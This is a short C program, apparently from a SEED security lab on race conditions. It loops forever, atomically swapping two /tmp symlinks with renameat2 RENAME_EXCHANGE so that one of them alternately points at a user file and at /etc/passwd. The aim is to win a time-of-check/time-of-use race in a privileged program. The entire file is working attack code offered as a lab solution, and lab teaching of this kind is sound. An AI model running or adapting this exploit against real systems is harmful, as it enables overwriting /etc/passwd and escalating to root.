#include <unistd.h>
#include <stdlib.h>
#include <sys/syscall.h>
#include <linux/fs.h>

int main()
{
	unsigned int flags = RENAME_EXCHANGE;
	
	unlink("/tmp/XYZ"); 
	symlink("/home/seed/race_cond/myfile", "/tmp/XYZ");
	unlink("/tmp/ABC");
	symlink("/etc/passwd", "/tmp/ABC");

	while(1) {
		syscall(SYS_renameat2, 0, "/tmp/XYZ", 0, "/tmp/ABC", flags);
		usleep(10000);
	}

	return 0;
}
